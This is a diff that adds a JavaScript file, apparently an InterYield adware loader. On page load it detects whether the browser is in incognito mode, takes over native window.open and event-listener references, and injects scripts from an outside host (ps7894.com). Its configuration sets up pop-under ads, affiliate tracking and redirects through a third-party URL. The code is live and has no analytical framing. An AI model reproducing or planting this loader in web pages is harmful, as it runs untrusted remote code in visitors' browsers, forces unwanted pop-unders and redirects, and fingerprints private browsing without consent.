@@ -1,0 +1,98 @@
+  
+var incognito = true;
+(function() {
+    try { // INTYD-338 
+        function notIncognito() {
+            incognito = false;
+        }
+        function inIncognito() {
+        }
+        if (navigator.userAgent.indexOf("Chrome") > -1) {
+            var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+            if (fs) {
+                fs(window.TEMPORARY, 1, notIncognito, inIncognito);
+            }
+        }
+    } catch (e) {
+    }
+
+    var started = false;
+    function writeScript(path) {
+        var scriptNode = document.createElement("script");
+        scriptNode.type = "text/javascript";
+        scriptNode.src = "https://www.ps7894.com" + path;
+        document.body.appendChild(scriptNode);
+    }
+
+    function initDom() {
+        // init the DOM for our use, need a head and body tag
+        try {
+            if (!document.getElementsByTagName('head')[0]) 
+                document.getElementsByTagName('html')[0].appendChild(document.createElement('head'));
+
+            if (!document.getElementsByTagName('body')[0]) 
+                document.getElementsByTagName('html')[0].appendChild(document.createElement('body'));
+
+        } catch (e) {
+
+        }
+    }
+    function getRandomString (len) {
+        var text = "";
+        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        for (var i = 0; i < len; i++) {
+            text += possible.charAt(Math.floor(Math.random() * possible.length));
+        }
+        return text;
+    }
+
+    function startIy(ab) {
+        if (started) return;
+        started = true;
+        
+        try {
+            // INTYD-325 
+            if(navigator.userAgent.indexOf("Edge/") > -1) {
+                if(window.name !== null && window.name.length > 10 && window.name.substring(0, 10) === 'InterYield') {
+                    return; // don't run IY in an IY window on Edge to conserve resources
+                }
+            }
+        } catch (e) {
+        }
+        
+        initDom();
+        try {
+         InterYieldNativeAddEventListener = window.addEventListener;
+         InterYieldNativeWindowOpen = window.open;
+        } catch (e) { }
+        try {
+            var tm = 10;
+            if(typeof InterYieldOptions !== "object") {
+                InterYieldOptions=new Array();
+            } else {
+                tm=200 * InterYieldOptions.length;
+            } 
+            setTimeout(function(){
+                    var iy = {"e":"click","affiliate":"tubecorp","subid":"6F","snoozeMinutes":"1","maxAdCountsPerInterval":"0","adCountIntervalHours":"24","pop":"under","attributionDisabled":"true","thirdpartyrd":"http://isecurepay.com/in/td583/?url=<<URL>>&sub=0","ae":"true","aecount":"1","aedelay1":"15","aedelay2":"30","aedelay3":"45","aedelay4":"60","aesnooze":"100","aeplus":"true","EndPoint":"https://www.ps7894.com","id":"hCCij","id2":"hmzOa","id3":"3bc91b5fd5ae8389c937444529cada7e","id4":"LWlGL","id5":"TgbIO"};
+                    iy.abenabled = ab;
+                    InterYieldOptions.push(iy);
+                    InterYieldScript = document.createElement("script");
+                    InterYieldScript.type = "text/javascript";
+                    InterYieldScript.src = "https://www.ps7894.com/p1.0-SNAPSHOT.144%2C778.do?a=true&e=click&ab=" + ab;
+                    document.getElementsByTagName("head")[0].appendChild(InterYieldScript);
+                    delete InterYieldScript;
+            },tm);
+
+        } catch (e) { 
+            console.log("init error " + e.toString());
+        }
+    }
+    
+
+    
+    
+    startIy(false);
+    
+
+
+})();
